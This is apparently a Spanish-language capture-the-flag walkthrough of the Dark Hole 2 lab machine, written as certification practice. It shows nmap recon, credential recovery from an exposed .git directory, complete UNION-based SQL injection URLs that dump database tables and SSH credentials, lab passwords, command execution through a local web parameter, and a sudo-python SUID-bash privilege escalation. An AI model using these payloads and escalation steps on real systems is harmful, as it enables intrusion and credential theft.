# Dark Hole 2

**Sistema Operativo**: Linux

**Dificultad**: Fácil

**Técnicas Vistas**: Information Leakage /
Github Project Enumeration /
SQLI (SQL Injection) /
Chisel (Remote Port Forwarding) + Abusing Internal Web Server /
Bash History - Information Leakage [User Pivoting] /
Abusing Sudoers Privilege [Privilege Escalation]

Te prepara para las **Certificaciones**: eWPT /
eJPT<br><br>

![image](https://github.com/user-attachments/assets/df5632d1-b6d2-4ff1-9a0e-d13c806622d9)<br><br>

# Reconocimiento

Utilizando `arp-scan` podemos encontrar la IP de la maquina.<br>

![image](https://github.com/user-attachments/assets/7948c487-8f54-4892-aed9-533f8b4b402e)<br><br>


Utilizando `nmap` escaneamos todos los puertos<br>

![image](https://github.com/user-attachments/assets/85d3ef85-382d-42ed-bd4b-dd5726519b06)<br>

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>


Utilizando `nmap` lanzamos los scrips mas comunes y encontramos una ruta `192.168.0.31/.git/`<br>

![image](https://github.com/user-attachments/assets/83c5b648-febc-4d76-9acc-1b5e5ba7ba1a)<br>

- `wget -r 192.168.0.31/.git/` -> Descargamos recursivamente todo lo que hay en `.git`

- `git log --oneline` -> Vemos los commit<br><br>

Nos llama la atención este commit<br> 

![image](https://github.com/user-attachments/assets/4d4316b4-e3db-4124-8786-891d95346f87)<br>

- `git show` -> Lo abrimos<br><br>

Encontramos credenciales:<br>

![image](https://github.com/user-attachments/assets/29d9c935-f6a8-4389-af05-84f5da1ac2b6)<br><br>


# SQLI

Vemos que es vulnerable a inyección SQL (Tiene 6 columnas)<br>

![image](https://github.com/user-attachments/assets/55af3420-cdff-455a-97c7-5e6f3d633ab6)<br><br>

- `http://192.168.0.31/dashboard.php?id=2%27%20union%20select%201,database(),3,4,5,6--%20-` -> Vemos la base de datos.<br>

- `http://192.168.0.31/dashboard.php?id=2%27%20union%20select%201,group_concat(schema_name),3,4,5,6%20from%20information_schema.schemata--%20-` -> Vemos todas las bases de datos.<br>

- `http://192.168.0.31/dashboard.php?id=2' union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema='darkhole_2'-- -` -> Vemos las tablas <br>

- `http://192.168.0.31/dashboard.php?id=2%27%20union%20select%201,group_concat(column_name),3,4,5,6%20from%20information_schema.columns%20where%20table_schema=%27darkhole_2%27%20and%20table_name=%27users%27--%20-` -> Vemos las columnas.<br>

----

- `http://192.168.0.31/dashboard.php?id=2%27%20union%20select%201,group_concat(user,0x3a,pass),3,4,5,6%20from%20ssh--%20-` -> Vemos usuario y contraseña de la tabla ssh<br><br>

![image](https://github.com/user-attachments/assets/3dbd0f60-4fc1-48df-b46b-20916439ac6f)<br>

Nos conectamos por ssh, `usuario = jehad`, `password = fool`<br>

![image](https://github.com/user-attachments/assets/7924fcd2-5a44-4b85-999b-9387b3411353)<br><br>

# Escalada de privilegios

en `/home/jehad/.bash_history` podemos ver que usa el comando `curl "http://127.0.0.1/?cmd=id"` el cual ejecuta comandos como el usuario `losy` <br>
![image](https://github.com/user-attachments/assets/447a376b-1c3f-4c61-97d6-c34a1a1256dc)<br><br>

Hacemos `curl "http://127.0.0.1/?cmd=cat%20/home/losy/.bash_history"`  y podremos leer la contraseña de `losy`<br>

![image](https://github.com/user-attachments/assets/6377702c-ee53-48c5-9cec-f5421d2b08c4)<br>

Nos conectamos  `su losy` password `gang`, con `sudo -l` vemos que podemos ejecutar como root el python3<br><br>

![image](https://github.com/user-attachments/assets/566e7bd3-c84a-4212-b9f7-9520e49aaa32)<br>

Hacemos este script en `/tmp/` donde importamos la libreria `os` de python y ejecutamos `chmod u+s /bin/bash` para ponerle SUID a la bash.<br>

![image](https://github.com/user-attachments/assets/a91ac4cf-3ca4-4e32-9af2-ee4aa8407cf1)<br><br>

Luego hacemos `bash -p` y somos root, flag final<br>

![image](https://github.com/user-attachments/assets/10e74083-5c19-493a-a069-901070303407)<br><br>

